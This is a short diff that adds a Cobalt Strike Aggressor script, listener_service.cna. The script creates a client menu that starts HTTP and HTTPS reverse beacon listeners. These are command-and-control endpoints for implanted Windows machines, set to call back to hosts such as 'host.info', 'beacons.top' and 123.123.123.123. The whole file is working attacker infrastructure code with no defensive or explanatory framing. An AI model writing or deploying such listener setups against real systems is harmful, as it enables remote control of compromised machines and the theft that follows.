@@ -1,0 +1,19 @@
+println('Loading listener_service.cna...');
+menubar("Fast listeners start","listeneers", 2);
+popup listeneers{
+menu "&1 Type"{
+item "&HTTP listener"{
+	println('listener_service.cna: Creating HTTP Listener...');
+	listener_create_ext("HTTP", "windows/beacon_http/reverse_http", %(host => "host.info", port => 80, beacons => "beacons.top", bindto => 80, strategy => "failover-5x", max_retry => "none"));
+}
+item "&HTTPS listener"{
+println('listener_service.cna: Creating HTTPS Listener...');
+	listener_create_ext("HTTPS", "windows/beacon_https/reverse_https", %(host => "123.123.123.123", port => 443, beacons => "123.123.123.123",  bindto => 443));
+}
+item "&GLOBAL start"{
+println('listener_service.cna: Creating all listeners...');
+	listener_create_ext("HTTPS", "windows/beacon_https/reverse_https", %(host => "123.123.123.123", port => 443, beacons => "123.123.123.123", bindto => 443));
+	
+	listener_create_ext("HTTP", "windows/beacon_http/reverse_http", %(host => "host.info", port => 80, beacons => "beacons.top", bindto => 80, strategy => "failover-5x", max_retry => "none"));
+}
+}}
